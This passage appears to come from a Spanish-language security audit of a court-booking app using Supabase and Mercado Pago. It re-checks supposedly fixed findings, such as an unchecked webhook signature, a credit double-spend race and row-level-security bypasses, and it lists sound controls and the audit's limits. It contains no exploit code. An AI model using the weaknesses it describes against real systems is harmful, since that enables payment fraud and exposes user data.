**Remediación sugerida.** Volver a 15 minutos como mínimo, y no borrar: marcar `status='expired'` para conservar la traza y poder reconciliar contra los pagos de MP. Añadir además el índice sobre `credits.locked_for_booking_id` que la 019 omitió, ya que el cron hace un scan cada minuto.

---

## Falsos remediados

Hallazgos que el reporte `audit-reports/06-reporte-resolucion-final.md` (01-Sep) da por cerrados y que **verifiqué que siguen abiertos** contra el código actual:

| ID previo | Estado declarado | Realidad verificada | Hallazgo de esta ronda |
|-----------|------------------|---------------------|------------------------|
| **SEC-03** — "Webhook MP sin validación de firma" | ✅ Resuelto — *"`crypto.timingSafeEqual`"* | La función existe pero está envuelta en `if (secret)` (`webhooks/mercadopago/route.ts:27`), y `MP_WEBHOOK_SECRET` **no está definida en `.env.local` ni en `.env.local.example`**. Hoy no se verifica ninguna firma. Se citó la existencia de la función como prueba de que el control corre. | **SEC-05 (ALTO)** |
| **NEG-02** — "Doble gasto de créditos (race condition)" | ✅ Resuelto — *"`019_credit_locks.sql`, `locked_for_booking_id`"* | La migración añade una **columna**, no atomicidad. `getAvailableCredits` (`manager.ts:89`) y el `UPDATE` de `applyCredits` (`manager.ts:136,154`) son round-trips HTTP separados sin transacción ni `FOR UPDATE`. La race sigue intacta y es la vía más rentable de toda la app. | **SEC-04 (CRÍTICO)** |
| **SEC-01** — "Bypass de RLS vía triggers `auth.uid() IS NULL`" | ✅ Resuelto — *"validación criptográfica `service_role`"* | Dos problemas. (a) La "validación criptográfica" es un `current_setting('request.jwt.claim.role', true)` — un GUC legacy retirado en PostgREST 9, que probablemente devuelve `NULL` en el Supabase actual y **rompe el bypass en lugar de asegurarlo**. (b) Más importante: el bypass real del trigger nunca fue el de `service_role`, sino la rama de dueño de venue evaluada contra `NEW.court_id` (`018:45-51`), que sigue palabra por palabra igual que en `014` y `017`. | **SEC-08 (ALTO)** y **SEC-02 (CRÍTICO)** |
| **SEC-06** — "PII expuesta en tabla `profiles`" | ✅ Resuelto — *"vista segura `public_user_profiles`"* | La policy `USING (true)` sí se eliminó (mejora real). Pero la vista que la reemplaza no lleva `security_invoker`, con lo que atraviesa el RLS que se acababa de endurecer, y no hay `REVOKE`: el padrón completo (`id`, `full_name`, `avatar_url`) sigue siendo enumerable con la anon key pública. Menos columnas, mismo problema estructural. | **SEC-20 (MEDIO)** |
| **SEC-05 prev.** — "Manipulación de créditos vía cliente RLS" | ✅ Resuelto — *"`manager.ts` usa `createAdminClient()`"* | La policy de UPDATE sobre `credits` sí se restringió a admin (`015:6-7`), correcto. Pero usar el admin client no es una remediación: es lo que **habilita** que `createCredit` (`manager.ts:60-73`) escriba créditos sin ninguna verificación de que la seña se haya pagado. Se cerró la puerta del cliente y se dejó la del servidor sin llave. | **SEC-12 (ALTO)** |
| **ARC-14** — "Disponibilidad expuesta sin filtrar" | ✅ Resuelto — *"`get_venue_availability` con SECURITY DEFINER"* | El RPC existe y se usa (`availability-grid.tsx:42`), pero se creó `SECURITY DEFINER` **sin `SET search_path`** y sin `REVOKE EXECUTE ... FROM PUBLIC` (`020:3-17`). Se cambió una lectura filtrada por RLS por una función que la saltea con privilegios de superusuario. Neto: probablemente neutro en exposición, peor en superficie. | **SEC-21 (MEDIO)** |

También verifiqué que **SEC-02 previo ("rutas backdoor `/upgrade` y `/mock-payment`") sí está genuinamente resuelto**: ambos archivos están borrados y no hay ninguna otra ruta que los reimplemente. Solo queda la referencia colgada de `client.ts:26` (SEC-28), que no es un backdoor.

---

## Lo que sí está bien hecho

Sin condescendencia — esto es trabajo correcto y hay que decirlo:

1. **`verifyWebhookSignature` está bien implementada** (`src/lib/mercadopago/helpers.ts:14-48`). El manifest `id:...;request-id:...;ts:...` sigue la especificación de MP, usa HMAC-SHA256, y el `try/catch` de la línea 45 neutraliza correctamente el `throw` de `timingSafeEqual` con buffers de distinta longitud. El problema es el `if (secret)` que la rodea, no la función. Reportes previos la señalaron como defectuosa; no lo es.

2. **El precio se recalcula íntegramente en el servidor** (`src/app/api/booking/create-preference/route.ts:34-49`). El body del cliente aporta `courtId`, `date` y `time`; `total_price` y `deposit_amount` salen de `pricing_rules` y de `venues.deposit_percentage` consultados en el backend. La inyección de precio desde el frontend está genuinamente cerrada.

3. **`getUser()` en todas las superficies de servidor** (`src/middleware.ts:33`, `dashboard/layout.tsx:13`, `admin/layout.tsx:14`, y las 12 Server Actions). No hay un solo `getSession()` en código de servidor — el único uso está en `src/hooks/useUser.ts:23`, que es cliente y solo pinta UI. Es la decisión correcta y está aplicada con consistencia.

4. **Ownership verificado explícitamente donde sí lo hicieron** (`src/app/dashboard/schedule/actions.ts:23-31` y `src/app/dashboard/venue/actions.ts:42-50,81-89`): resuelven el venue del recurso y lo comparan con `user.id` antes de escribir, sin confiar en RLS. Es exactamente el patrón que le falta a `dashboard/bookings/actions.ts`.

5. **Los secretos están limpios.** `git check-ignore -v .env.local` → cubierto por `.gitignore:29`. `git log --all --diff-filter=A -- '*.env*'` solo devuelve `.env.local.example` (plantilla vacía). `SUPABASE_SERVICE_ROLE_KEY`, `MERCADOPAGO_ACCESS_TOKEN` y `RESEND_API_KEY` nunca llevan prefijo `NEXT_PUBLIC_` y no aparecen en ningún componente cliente.

6. **`createAdminClient()` falla ruidosamente si falta la clave** (`src/lib/supabase/server.ts:34-36`) y desactiva `autoRefreshToken`/`persistSession` (`:42-45`). Además, el service_role está confinado a cuatro archivos de servidor (`create-preference`, `webhooks/mercadopago`, `lib/booking/actions`, `lib/credits/manager`) — un blast radius acotado y auditable.

7. **`cancelBooking` filtra por `user_id` en la propia consulta** (`src/lib/booking/actions.ts:12-16`), con `.eq("id", bookingId).eq("user_id", user.id)`, en vez de leer y comparar después. El IDOR de cancelación está bien cerrado, y lo mismo en `success/page.tsx:38-39` y `actions/booking.ts:14-15`.

8. **El índice único parcial de doble reserva es correcto** (`008_fix_booking_constraint.sql:8-10`): `UNIQUE (court_id, booking_date, start_time) WHERE status NOT IN ('cancelled')`. Es una garantía a nivel de base que resiste races de aplicación, y está bien pensado para permitir rebookear un slot cancelado.

---

## Límites de esta auditoría

Qué **no** pude verificar, y qué haría falta para cerrarlo:

- **El estado real de la base en producción.** Reconstruí las políticas leyendo las 20 migraciones en orden y aplicando `CREATE OR REPLACE` / `DROP POLICY` mentalmente. No ejecuté SQL. Si alguien aplicó cambios desde el dashboard de Supabase sin migración, mi reconstrucción diverge. **Para cerrar:** volcar `pg_policies`, `pg_proc.proconfig`, `information_schema.role_table_grants` y `storage.buckets` del proyecto real y compararlos con el repo.

- **Si las migraciones 013–020 están aplicadas.** Son archivos `??` (untracked) del working tree. Puede que estén en la base, puede que no. Si `015` no se aplicó, la policy `Public profiles are viewable by everyone USING (true)` de `002:22-23` sigue viva y el email, teléfono, rol y `credit_balance` de todos los usuarios son públicos — eso sería un CRÍTICO adicional.

- **Configuración de Supabase fuera del repo:** no hay `supabase/config.toml`. No sé el valor de `verify_jwt` de las Edge Functions (SEC-07), ni la allowlist de Redirect URLs de Auth (relevante para SEC-15), ni la versión de PostgREST desplegada (determinante para SEC-08), ni los `GRANT`s por defecto del esquema `public` (SEC-21).

- **Variables de entorno de producción.** Auditué `.env.local`, que es el entorno de desarrollo local. El de Vercel puede tener `MP_WEBHOOK_SECRET` y `NEXT_PUBLIC_APP_URL` definidas, lo que degradaría SEC-05 y anularía SEC-27. El defecto de diseño de SEC-05 (`if (secret)` en vez de fallar cerrado) persiste igual.

- **Comportamiento real del SDK de Mercado Pago** respecto a `options.idempotencyKey` a nivel de config (SEC-13). Confirmarlo requiere llamadas al sandbox de MP, fuera del alcance read-only.

- **`httpOnly` de la cookie de sesión de Supabase.** Doy por sentado que es legible desde JS porque `@supabase/ssr` la comparte con el cliente de navegador. Es lo que determina si SEC-01 es toma de cuenta o "solo" XSS. **Para cerrar:** inspeccionar los `Set-Cookie` de una respuesta real.

- **No ejecuté los tests** (`vitest`) ni levanté la app. `npx tsc --noEmit` y `next lint` pasan limpios, pero eso no dice nada sobre autorización. Nota al margen: `src/app/(auth)/login/page.tsx:7` y `src/app/(main)/profile/page.tsx:6` importan `@/hooks/use-user`, mientras que el archivo real es `src/hooks/useUser.ts` y `header.tsx:8` usa la grafía correcta — en un filesystem case-sensitive (Linux, Vercel) eso rompe el build. Los `@ts-expect-error` de esas líneas son lo que impide que `tsc` lo señale.

- **No hice pruebas dinámicas de ningún tipo.** Todos los ataques descritos están derivados por lectura de código y de SQL. Los tres que dependían de comportamiento del runtime (el `NaN` de fechas, el open redirect por `@`, el escapado de `JSON.stringify`) los verifiqué con `node -e` local y están marcados como confirmados; el resto de los pasos de explotación son deducciones sobre semántica documentada de Postgres RLS y PostgREST.
